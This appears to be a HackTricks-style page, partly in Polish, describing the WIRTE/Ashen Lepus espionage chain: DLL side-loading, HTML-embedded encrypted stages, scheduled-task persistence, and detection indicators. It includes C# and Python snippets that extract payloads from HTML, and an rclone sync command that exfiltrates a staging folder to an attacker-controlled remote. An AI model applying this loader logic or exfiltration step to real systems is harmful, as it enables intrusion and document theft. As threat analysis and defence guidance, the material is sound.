# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd technik

Ashen Lepus (aka WIRTE) weaponized a repeatable pattern that chains DLL sideloading, staged HTML payloads, and modular .NET backdoors to persist inside Middle Eastern diplomatic networks. The technique is reusable by any operator because it relies on:

- **Archive-based social engineering**: benign PDFs instruct targets to pull a RAR archive from a file-sharing site. The archive bundles a real-looking document viewer EXE, a malicious DLL named after a trusted library (e.g., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), and a decoy `Document.pdf`.
- **DLL search order abuse**: the victim double-clicks the EXE, Windows resolves the DLL import from the current directory, and the malicious loader (AshenLoader) executes inside the trusted process while the decoy PDF opens to avoid suspicion.
- **Living-off-the-land staging**: every later stage (AshenStager → AshenOrchestrator → modules) is kept off disk until needed, delivered as encrypted blobs hidden inside otherwise harmless HTML responses.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: the EXE side-loads AshenLoader, which performs host recon, AES-CTR encrypts it, and POSTs it inside rotating parameters such as `token=`, `id=`, `q=`, or `auth=` to API-looking paths (e.g., `/api/v2/account`).
2. **HTML extraction**: the C2 only betrays the next stage when the client IP geolocates to the target region and the `User-Agent` matches the implant, frustrating sandboxes. When the checks pass the HTTP body contains a `<headerp>...</headerp>` blob with the Base64/AES-CTR encrypted AshenStager payload.
3. **Second sideload**: AshenStager is deployed with another legitimate binary that imports `wtsapi32.dll`. The malicious copy injected into the binary fetches more HTML, this time carving `<article>...</article>` to recover AshenOrchestrator.
4. **AshenOrchestrator**: a modular .NET controller that decodes a Base64 JSON config. The config’s `tg` and `au` fields are concatenated/hashed into the AES key, which decrypts `xrk`. The resulting bytes act as an XOR key for every module blob fetched afterwards.
5. **Module delivery**: each module is described through HTML comments that redirect the parser to an arbitrary tag, breaking static rules that look only for `<headerp>` or `<article>`. Modules include persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), and file exploration (`FE`).

### Wzorzec parsowania kontenera HTML
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Nawet jeśli obrońcy zablokują lub usuną konkretny element, operator musi tylko zmienić tag wskazany w komentarzu HTML, aby wznowić dostarczanie.

### Szybki pomocnik do ekstrakcji (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralele unikania wykrywania w HTML Stagingu

Ostatnie badania HTML smuggling (Talos) pokazują ładunki ukryte jako ciągi Base64 wewnątrz bloków `<script>` w załącznikach HTML i dekodowane przez JavaScript w czasie wykonywania. Ten sam trik można wykorzystać dla odpowiedzi C2: umieścić zaszyfrowane bloby wewnątrz tagu script (lub innego elementu DOM) i zdekodować je w pamięci przed AES/XOR, sprawiając, że strona wygląda jak zwykłe HTML. Talos pokazuje też warstwową obfuskację (zmiana identyfikatorów plus Base64/Caesar/AES) wewnątrz tagów script, co dobrze przekłada się na HTML-staged C2 blobs.

## Notatki o najnowszych wariantach (2024-2025)

- Check Point observed WIRTE campaigns in 2024 that still hinged on archive-based sideloading but used `propsys.dll` (stagerx64) as the first stage. The stager decodes the next payload with Base64 + XOR (key `53`), sends HTTP requests with a hardcoded `User-Agent`, and extracts encrypted blobs embedded between HTML tags. In one branch, the stage was reconstructed from a long list of embedded IP strings decoded via `RtlIpv4StringToAddressA`, then concatenated into the payload bytes.
- OWN-CERT documented earlier WIRTE tooling where the side-loaded `wtsapi32.dll` dropper protected strings with Base64 + TEA and used the DLL name itself as the decryption key, then XOR/Base64-obfuscated host identification data before sending it to the C2.

## Wzmocnienia Crypto i C2

- **AES-CTR everywhere**: obecne loadery osadzają 256-bitowe klucze oraz nonces (np. `{9a 20 51 98 ...}`) i opcjonalnie dodają warstwę XOR używając stringów takich jak `msasn1.dll` przed/po deszyfrowaniu.
- **Key material variations**: wcześniejsze loadery używały Base64 + TEA do ochrony osadzonych stringów, przy czym klucz deszyfrujący był wyprowadzany z nazwy złośliwej DLL (np. `wtsapi32.dll`).
- **Infrastructure split + subdomain camouflage**: serwery stagingowe są rozdzielone per narzędzie, hostowane w różnych ASN i czasami wystawione pod wyglądającymi na legitne subdomenami, więc spalenie jednego etapu nie ujawnia reszty.
- **Recon smuggling**: zbierane informacje teraz obejmują listingi Program Files, aby wykrywać aplikacje o wysokiej wartości i są zawsze szyfrowane przed opuszczeniem hosta.
- **URI churn**: parametry zapytań i ścieżki REST rotują między kampaniami (`/api/v1/account?token=` → `/api/v2/account?auth=`), unieważniając kruche wykrycia.
- **User-Agent pinning + safe redirects**: infrastruktura C2 odpowiada tylko na dokładne stringi UA, w przeciwnym razie przekierowuje do nieszkodliwych serwisów informacyjnych/zdrowotnych, aby się upodobnić do ruchu.
- **Gated delivery**: serwery są geo-ogrodzone i odpowiadają tylko prawdziwym implantom. Nieautoryzowani klienci otrzymują HTML niebudzący podejrzeń.

## Utrzymanie i pętla wykonania

AshenStager tworzy scheduled tasks, które podszywają się pod zadania konserwacyjne Windows i wykonują się przez `svchost.exe`, np.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Te zadania ponownie uruchamiają łańcuch sideloading przy starcie systemu lub w odstępach, zapewniając, że AshenOrchestrator może pobierać świeże moduły bez ponownego zapisywania na dysku.

## Wykorzystanie legalnych klientów synchronizacji do eksfiltracji

Operatorzy umieszczają dokumenty dyplomatyczne w `C:\Users\Public` (dostępne dla wszystkich i niebudzące podejrzeń) za pomocą dedykowanego modułu, a następnie pobierają legalny binarny plik [Rclone](https://rclone.org/) do synchronizacji tego katalogu z przestrzenią atakującego. Unit42 wskazuje, że to pierwszy znany przypadek, w którym aktor użył Rclone do eksfiltracji, co wpisuje się w szerszy trend nadużywania legalnych narzędzi synchronizacyjnych, aby wtopić się w normalny ruch:

1. **Stage**: skopiuj/zbierz pliki celu do `C:\Users\Public\{campaign}\`.
2. **Configure**: dostarcz plik konfiguracyjny Rclone wskazujący na kontrolowany przez atakującego endpoint HTTPS (np. `api.technology-system[.]com`).
3. **Sync**: uruchom `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`, tak aby ruch przypominał normalne kopie zapasowe w chmurze.

Ponieważ Rclone jest szeroko wykorzystywany w legalnych procesach backupu, obrońcy powinni skupić się na anomalnych wykonaniach (nowe binarki, dziwne remote'y lub nagła synchronizacja `C:\Users\Public`).

## Wskaźniki detekcji

- Alertuj na **signed processes**, które niespodziewanie ładują DLL z user-writable paths (Procmon filters + `Get-ProcessMitigation -Module`), zwłaszcza gdy nazwy DLL pokrywają się z `netutils`, `srvcli`, `dwampi` lub `wtsapi32`.
- Analizuj podejrzane odpowiedzi HTTPS pod kątem **dużych Base64 blobów osadzonych w nietypowych tagach** lub chronionych komentarzami `<!-- TAG: <xyz> -->`.
- Rozszerz polowanie w HTML o **ciągi Base64 wewnątrz `<script>` bloków** (HTML smuggling-style staging), które są dekodowane przez JavaScript przed przetworzeniem AES/XOR.
- Szukaj **scheduled tasks**, które uruchamiają `svchost.exe` z argumentami niebędącymi service lub wskazują na katalogi dropper.
- Śledź **C2 redirects**, które zwracają ładunki tylko dla dokładnych stringów `User-Agent`, a w przeciwnym razie przekierowują do legalnych stron informacyjnych/zdrowotnych.
- Monitoruj pojawianie się binarek **Rclone** poza lokalizacjami zarządzanymi przez IT, nowe pliki `rclone.conf` lub zadania synchronizacji pobierające z katalogów stagingowych jak `C:\Users\Public`.

## Źródła

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
